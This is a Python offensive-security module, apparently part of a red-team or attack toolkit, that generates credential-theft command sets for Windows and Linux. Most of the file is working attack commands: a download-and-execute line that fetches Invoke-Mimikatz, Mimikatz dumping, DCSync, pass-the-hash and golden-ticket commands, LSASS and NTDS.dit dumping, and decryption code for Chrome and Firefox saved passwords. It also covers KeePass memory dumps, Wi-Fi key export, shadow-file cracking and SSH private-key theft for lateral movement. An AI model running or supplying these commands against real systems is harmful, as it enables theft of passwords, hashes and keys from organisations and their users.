"""
Credential Harvesting Module
Extract credentials from Windows and Linux systems using various techniques.
"""

import asyncio
import json
import base64
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Literal
from enum import Enum


class CredentialSource(str, Enum):
    """Credential harvesting sources"""
    MIMIKATZ = "mimikatz"
    LSASS_DUMP = "lsass_dump"
    NTDS_DIT = "ntds_dit"
    SAM_DATABASE = "sam_database"
    BROWSER_CHROME = "browser_chrome"
    BROWSER_FIREFOX = "browser_firefox"
    BROWSER_EDGE = "browser_edge"
    KEEPASS = "keepass"
    WIFI_PASSWORDS = "wifi_passwords"
    REGISTRY_SECRETS = "registry_secrets"
    LINUX_SHADOW = "linux_shadow"
    SSH_KEYS = "ssh_keys"


@dataclass
class Credential:
    """Harvested credential"""
    source: CredentialSource
    username: str
    password: Optional[str] = None
    hash: Optional[str] = None  # NTLM, MD5, etc.
    domain: Optional[str] = None
    credential_type: str = "plaintext"  # plaintext, hash, key
    additional_data: Dict = field(default_factory=dict)
    
    def to_dict(self) -> Dict:
        return {
            "source": self.source.value,
            "username": self.username,
            "password": self.password,
            "hash": self.hash,
            "domain": self.domain,
            "credential_type": self.credential_type,
            "additional_data": self.additional_data
        }


@dataclass
class HarvestingTechnique:
    """Credential harvesting technique details"""
    source: CredentialSource
    platform: str  # windows, linux
    commands: List[str]
    description: str
    requires_admin: bool
    mitre_technique: str
    detection_risk: str  # low, medium, high
    
    def to_dict(self) -> Dict:
        return {
            "source": self.source.value,
            "platform": self.platform,
            "commands": self.commands,
            "description": self.description,
            "requires_admin": self.requires_admin,
            "mitre_technique": self.mitre_technique,
            "detection_risk": self.detection_risk
        }


class CredentialHarvester:
    """Automated credential harvesting"""
    
    def __init__(self):
        self.harvested_creds: List[Credential] = []
    
    async def generate_mimikatz_commands(self) -> HarvestingTechnique:
        """Generate Mimikatz credential dumping commands"""
        
        commands = [
            "# Download and execute Mimikatz",
            "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')",
            "",
            "# Dump logon passwords",
            "Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords'",
            "",
            "# Dump SAM database",
            "Invoke-Mimikatz -Command 'privilege::debug lsadump::sam'",
            "",
            "# Dump LSA secrets",
            "Invoke-Mimikatz -Command 'privilege::debug lsadump::secrets'",
            "",
            "# Export all tickets (Kerberos)",
            "Invoke-Mimikatz -Command 'privilege::debug sekurlsa::tickets /export'",
            "",
            "# Pass-the-Hash",
            "Invoke-Mimikatz -Command 'privilege::debug sekurlsa::pth /user:Administrator /domain:CORP /ntlm:<hash> /run:cmd'",
            "",
            "# Golden Ticket (requires krbtgt hash)",
            "Invoke-Mimikatz -Command 'kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-xxx /krbtgt:<hash> /ptt'",
            "",
            "# DCSync (dump credentials from Domain Controller)",
            "Invoke-Mimikatz -Command 'lsadump::dcsync /user:Administrator /domain:corp.local'",
            "",
            "# Alternative: Use mimikatz.exe directly",
            "mimikatz.exe 'privilege::debug' 'sekurlsa::logonpasswords' 'exit'"
        ]
        
        return HarvestingTechnique(
            source=CredentialSource.MIMIKATZ,
            platform="windows",
            commands=commands,
            description="Mimikatz - Extract plaintext passwords, hashes, and Kerberos tickets from memory",
            requires_admin=True,
            mitre_technique="T1003.001",
            detection_risk="high"
        )
    
    async def generate_lsass_dump(self) -> HarvestingTechnique:
        """Generate LSASS dumping commands"""
        
        commands = [
            "# Method 1: Task Manager (Manual)",
            "# Right-click lsass.exe -> Create dump file",
            "",
            "# Method 2: Procdump (SysInternals)",
            "procdump.exe -accepteula -ma lsass.exe lsass.dmp",
            "",
            "# Method 3: comsvcs.dll (Native Windows DLL)",
            "$lsassPID = (Get-Process lsass).Id",
            "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump $lsassPID C:\\Windows\\Temp\\lsass.dmp full",
            "",
            "# Method 4: PowerShell MiniDump",
            "$lsass = Get-Process lsass",
            "$dumpFile = 'C:\\Windows\\Temp\\lsass.dmp'",
            "[System.Diagnostics.Process]::EnterDebugMode()",
            "$fs = New-Object IO.FileStream($dumpFile, [IO.FileMode]::Create)",
            "[Win32]::MiniDumpWriteDump($lsass.Handle, $lsass.Id, $fs.SafeFileHandle.DangerousGetHandle(), 2, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero)",
            "$fs.Close()",
            "",
            "# Method 5: SQLDumper.exe (if SQL Server installed)",
            "sqldumper.exe <lsass_PID> 0 0x01100",
            "",
            "# Extract credentials from dump (on attacker machine)",
            "# Use Mimikatz:",
            "mimikatz.exe 'sekurlsa::minidump lsass.dmp' 'sekurlsa::logonpasswords' 'exit'",
            "",
            "# OR use pypykatz (Python):",
            "pypykatz lsa minidump lsass.dmp"
        ]
        
        return HarvestingTechnique(
            source=CredentialSource.LSASS_DUMP,
            platform="windows",
            commands=commands,
            description="LSASS memory dump - Extract credentials from Local Security Authority Subsystem Service",
            requires_admin=True,
            mitre_technique="T1003.001",
            detection_risk="medium"
        )
    
    async def generate_ntds_extraction(self) -> HarvestingTechnique:
        """Generate NTDS.dit extraction commands"""
        
        commands = [
            "# NTDS.dit Extraction - Domain Controller Credentials",
            "",
            "# Method 1: VSS Shadow Copy",
            "vssadmin create shadow /for=C:",
            "copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit C:\\Temp\\ntds.dit",
            "copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\Temp\\SYSTEM",
            "vssadmin delete shadows /shadow={GUID} /quiet",
            "",
            "# Method 2: ntdsutil (Native Windows tool)",
            "ntdsutil",
            "activate instance ntds",
            "ifm",
            "create full C:\\Temp\\ntds_backup",
            "quit",
            "quit",
            "",
            "# Method 3: PowerShell VSS",
            "(Get-WmiObject -List Win32_ShadowCopy).Create('C:\\', 'ClientAccessible')",
            "$shadow = Get-WmiObject Win32_ShadowCopy | Select-Object -Last 1",
            "cmd /c copy $($shadow.DeviceObject)\\Windows\\NTDS\\NTDS.dit C:\\Temp\\ntds.dit",
            "cmd /c copy $($shadow.DeviceObject)\\Windows\\System32\\config\\SYSTEM C:\\Temp\\SYSTEM",
            "$shadow.Delete()",
            "",
            "# Extract hashes (on attacker machine)",
            "# Use secretsdump.py (Impacket):",
            "secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL",
            "",
            "# OR use DSInternals PowerShell module:",
            "Import-Module DSInternals",
            "$key = Get-BootKey -SystemHivePath .\\SYSTEM",
            "Get-ADDBAccount -All -DBPath .\\ntds.dit -BootKey $key | Format-Custom -View HashcatNT"
        ]
        
        return HarvestingTechnique(
            source=CredentialSource.NTDS_DIT,
            platform="windows",
            commands=commands,
            description="NTDS.dit extraction - Dump all Active Directory password hashes from Domain Controller",
            requires_admin=True,
            mitre_technique="T1003.003",
            detection_risk="high"
        )
    
    async def generate_sam_dump(self) -> HarvestingTechnique:
        """Generate SAM database dumping commands"""
        
        commands = [
            "# SAM Database Extraction - Local Windows accounts",
            "",
            "# Method 1: Registry export",
            "reg save HKLM\\SAM C:\\Temp\\sam.hive",
            "reg save HKLM\\SYSTEM C:\\Temp\\system.hive",
            "",
            "# Method 2: VSS Shadow Copy",
            "copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM C:\\Temp\\sam.hive",
            "copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\Temp\\system.hive",
            "",
            "# Method 3: PowerShell",
            "reg export HKLM\\SAM C:\\Temp\\sam.reg",
            "reg export HKLM\\SYSTEM C:\\Temp\\system.reg",
            "",
            "# Extract hashes (on attacker machine)",
            "# Use samdump2:",
            "samdump2 system.hive sam.hive",
            "",
            "# OR use secretsdump.py (Impacket):",
            "secretsdump.py -sam sam.hive -system system.hive LOCAL",
            "",
            "# OR use Mimikatz:",
            "mimikatz.exe 'lsadump::sam /system:system.hive /sam:sam.hive' 'exit'"
        ]
        
        return HarvestingTechnique(
            source=CredentialSource.SAM_DATABASE,
            platform="windows",
            commands=commands,
            description="SAM database dump - Extract local Windows account password hashes",
            requires_admin=True,
            mitre_technique="T1003.002",
            detection_risk="medium"
        )
    
    async def generate_browser_chrome(self) -> HarvestingTechnique:
        """Generate Chrome credential extraction commands"""
        
        commands = [
            "# Chrome Password Extraction",
            "",
            "# Chrome stores passwords in SQLite database (encrypted with DPAPI)",
            "# Location: %LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data",
            "",
            "# PowerShell extraction:",
            "$chromeDB = \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data\"",
            "$tempDB = \"$env:TEMP\\ChromeLoginData\"",
            "Copy-Item -Path $chromeDB -Destination $tempDB",
            "",
            "# Use SQLite to read database",
            "# Install: https://www.sqlite.org/download.html",
            "sqlite3.exe $tempDB \"SELECT origin_url, username_value, password_value FROM logins\"",
            "",
            "# Decrypt passwords using DPAPI (C# code):",
            "// C# DPAPI decryption",
            "using System.Security.Cryptography;",
            "byte[] encryptedData = ...; // from database",
            "byte[] decryptedData = ProtectedData.Unprotect(encryptedData, null, DataProtectionScope.CurrentUser);",
            "string password = Encoding.UTF8.GetString(decryptedData);",
            "",
            "# Python extraction (using pycryptodome):",
            "import sqlite3, os, base64, json",
            "from Crypto.Cipher import AES",
            "import win32crypt",
            "",
            "chrome_path = os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')",
            "conn = sqlite3.connect(chrome_path)",
            "cursor = conn.cursor()",
            "cursor.execute('SELECT origin_url, username_value, password_value FROM logins')",
            "for row in cursor.fetchall():",
            "    password = win32crypt.CryptUnprotectData(row[2], None, None, None, 0)[1]",
            "    print(f'{row[0]} | {row[1]} | {password.decode()}')"
        ]
        
        return HarvestingTechnique(
            source=CredentialSource.BROWSER_CHROME,
            platform="windows",
            commands=commands,
            description="Chrome password extraction - Decrypt and extract saved passwords from Chrome browser",
            requires_admin=False,
            mitre_technique="T1555.003",
            detection_risk="low"
        )
    
    async def generate_browser_firefox(self) -> HarvestingTechnique:
        """Generate Firefox credential extraction commands"""
        
        commands = [
            "# Firefox Password Extraction",
            "",
            "# Firefox stores credentials in logins.json (encrypted)",
            "# Location: %APPDATA%\\Mozilla\\Firefox\\Profiles\\<profile>\\logins.json",
            "",
            "# Find Firefox profile:",
            "$profilePath = Get-ChildItem \"$env:APPDATA\\Mozilla\\Firefox\\Profiles\" | Select-Object -First 1",
            "$loginsFile = Join-Path $profilePath.FullName 'logins.json'",
            "",
            "# Extract encrypted data:",
            "$logins = Get-Content $loginsFile | ConvertFrom-Json",
            "$logins.logins | ForEach-Object {",
            "    Write-Host \"URL: $($_.hostname)\"",
            "    Write-Host \"Username: $($_.encryptedUsername)\"",
            "    Write-Host \"Password: $($_.encryptedPassword)\"",
            "}",
            "",
            "# Decrypt using Firefox NSS library (Python):",
            "# Install: pip install pyasn1 pycryptodome",
            "",
            "import json, os, base64",
            "from Crypto.Cipher import DES3",
            "",
            "profile = os.path.join(os.environ['APPDATA'], 'Mozilla', 'Firefox', 'Profiles')",
            "# Use firefox_decrypt.py tool:",
            "# https://github.com/unode/firefox_decrypt",
            "python firefox_decrypt.py",
            "",
            "# OR use LaZagne (automated tool):",
            "laZagne.exe browsers -firefox"
        ]
        
        return HarvestingTechnique(
            source=CredentialSource.BROWSER_FIREFOX,
            platform="windows",
            commands=commands,
            description="Firefox password extraction - Decrypt and extract saved passwords from Firefox browser",
            requires_admin=False,
            mitre_technique="T1555.003",
            detection_risk="low"
        )
    
    async def generate_keepass_extraction(self) -> HarvestingTechnique:
        """Generate KeePass extraction commands"""
        
        commands = [
            "# KeePass Password Manager Extraction",
            "",
            "# Method 1: Find KeePass database",
            "Get-ChildItem -Path C:\\ -Include *.kdbx -Recurse -ErrorAction SilentlyContinue",
            "",
            "# Method 2: Extract master password from memory (if KeePass is running)",
            "# Use KeeFarce: https://github.com/denandz/KeeFarce",
            "KeeFarce.exe",
            "",
            "# Method 3: Dump KeePass process memory",
            "$keepassProc = Get-Process KeePass -ErrorAction SilentlyContinue",
            "if ($keepassProc) {",
            "    procdump.exe -ma $keepassProc.Id keepass.dmp",
            "    # Analyze with strings:",
            "    strings.exe keepass.dmp | Select-String -Pattern 'password|key'",
            "}",
            "",
            "# Method 4: Brute force .kdbx file (offline)",
            "# Use keepass2john:",
            "keepass2john database.kdbx > keepass.hash",
            "john --wordlist=rockyou.txt keepass.hash",
            "",
            "# OR use hashcat:",
            "hashcat -m 13400 keepass.hash rockyou.txt"
        ]
        
        return HarvestingTechnique(
            source=CredentialSource.KEEPASS,
            platform="windows",
            commands=commands,
            description="KeePass extraction - Extract master password or dump KeePass database",
            requires_admin=False,
            mitre_technique="T1555.005",
            detection_risk="medium"
        )
    
    async def generate_wifi_passwords(self) -> HarvestingTechnique:
        """Generate WiFi password extraction commands"""
        
        commands = [
            "# WiFi Password Extraction (Windows)",
            "",
            "# Method 1: netsh (Native Windows)",
            "netsh wlan show profiles",
            "netsh wlan show profile name=\"SSID_NAME\" key=clear",
            "",
            "# Method 2: PowerShell automation",
            "(netsh wlan show profiles) | Select-String '\\:(.+)$' | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=$name key=clear)} | Select-String 'Key Content\\W+\\:(.+)$' | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize",
            "",
            "# Method 3: Export all WiFi profiles",
            "netsh wlan export profile key=clear folder=C:\\Temp",
            "",
            "# Linux WiFi passwords:",
            "# Stored in: /etc/NetworkManager/system-connections/",
            "sudo cat /etc/NetworkManager/system-connections/*",
            "",
            "# Extract PSK (password):",
            "sudo grep -r '^psk=' /etc/NetworkManager/system-connections/"
        ]
        
        return HarvestingTechnique(
            source=CredentialSource.WIFI_PASSWORDS,
            platform="multi",
            commands=commands,
            description="WiFi password extraction - Extract saved wireless network passwords",
            requires_admin=False,
            mitre_technique="T1555",
            detection_risk="low"
        )
    
    async def generate_linux_shadow(self) -> HarvestingTechnique:
        """Generate Linux shadow file extraction"""
        
        commands = [
            "# Linux Password Hash Extraction",
            "",
            "# Extract /etc/shadow (requires root)",
            "cat /etc/shadow",
            "",
            "# Copy for offline cracking",
            "cp /etc/shadow /tmp/shadow",
            "cp /etc/passwd /tmp/passwd",
            "",
            "# Unshadow (combine passwd + shadow for John)",
            "unshadow /tmp/passwd /tmp/shadow > /tmp/unshadowed.txt",
            "",
            "# Crack with John the Ripper:",
            "john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/unshadowed.txt",
            "",
            "# OR use hashcat:",
            "# Extract hash format first:",
            "# $6$ = SHA-512",
            "# $5$ = SHA-256",
            "# $1$ = MD5",
            "hashcat -m 1800 /tmp/shadow /usr/share/wordlists/rockyou.txt",
            "",
            "# Check for weak passwords:",
            "john --show /tmp/unshadowed.txt"
        ]
        
        return HarvestingTechnique(
            source=CredentialSource.LINUX_SHADOW,
            platform="linux",
            commands=commands,
            description="Linux shadow file extraction - Extract and crack password hashes from /etc/shadow",
            requires_admin=True,
            mitre_technique="T1003.008",
            detection_risk="medium"
        )
    
    async def generate_ssh_keys(self) -> HarvestingTechnique:
        """Generate SSH key extraction commands"""
        
        commands = [
            "# SSH Private Key Extraction",
            "",
            "# Find SSH keys on system",
            "find / -name id_rsa 2>/dev/null",
            "find / -name id_ed25519 2>/dev/null",
            "find / -name id_ecdsa 2>/dev/null",
            "",
            "# Common locations:",
            "ls -la ~/.ssh/",
            "cat ~/.ssh/id_rsa",
            "cat ~/.ssh/id_ed25519",
            "",
            "# Find all users' SSH keys:",
            "find /home -name id_rsa 2>/dev/null",
            "find /root -name id_rsa 2>/dev/null",
            "",
            "# Check authorized_keys (tells you where keys can be used):",
            "cat ~/.ssh/authorized_keys",
            "",
            "# Extract and use:",
            "cp ~/.ssh/id_rsa /tmp/stolen_key",
            "chmod 600 /tmp/stolen_key",
            "ssh -i /tmp/stolen_key user@target",
            "",
            "# Crack encrypted SSH keys:",
            "# Convert to John format:",
            "ssh2john id_rsa > id_rsa.hash",
            "john --wordlist=rockyou.txt id_rsa.hash"
        ]
        
        return HarvestingTechnique(
            source=CredentialSource.SSH_KEYS,
            platform="linux",
            commands=commands,
            description="SSH key extraction - Find and extract private SSH keys for lateral movement",
            requires_admin=False,
            mitre_technique="T1552.004",
            detection_risk="low"
        )
    
    async def generate_all_techniques(self, platform: Literal["windows", "linux", "multi"] = "windows") -> List[HarvestingTechnique]:
        """Generate all credential harvesting techniques"""
        
        techniques = []
        
        if platform in ["windows", "multi"]:
            techniques.append(await self.generate_mimikatz_commands())
            techniques.append(await self.generate_lsass_dump())
            techniques.append(await self.generate_ntds_extraction())
            techniques.append(await self.generate_sam_dump())
            techniques.append(await self.generate_browser_chrome())
            techniques.append(await self.generate_browser_firefox())
            techniques.append(await self.generate_keepass_extraction())
            techniques.append(await self.generate_wifi_passwords())
        
        if platform in ["linux", "multi"]:
            techniques.append(await self.generate_linux_shadow())
            techniques.append(await self.generate_ssh_keys())
        
        return techniques
    
    async def generate_report(self, techniques: List[HarvestingTechnique]) -> Dict:
        """Generate credential harvesting report"""
        
        return {
            "total_techniques": len(techniques),
            "by_platform": {
                "windows": len([t for t in techniques if t.platform == "windows"]),
                "linux": len([t for t in techniques if t.platform == "linux"]),
                "multi": len([t for t in techniques if t.platform == "multi"])
            },
            "requires_admin": len([t for t in techniques if t.requires_admin]),
            "detection_risk": {
                "high": len([t for t in techniques if t.detection_risk == "high"]),
                "medium": len([t for t in techniques if t.detection_risk == "medium"]),
                "low": len([t for t in techniques if t.detection_risk == "low"])
            },
            "techniques": [t.to_dict() for t in techniques]
        }


async def main():
    """Example usage"""
    harvester = CredentialHarvester()
    
    print("[*] Generating credential harvesting techniques...")
    all_techniques = await harvester.generate_all_techniques("multi")
    print(f"[+] Generated {len(all_techniques)} harvesting techniques")
    
    report = await harvester.generate_report(all_techniques)
    print(f"\n[+] Report:")
    print(f"    Total techniques: {report['total_techniques']}")
    print(f"    Windows: {report['by_platform']['windows']}")
    print(f"    Linux: {report['by_platform']['linux']}")
    print(f"    Requires admin: {report['requires_admin']}")


if __name__ == "__main__":
    asyncio.run(main())
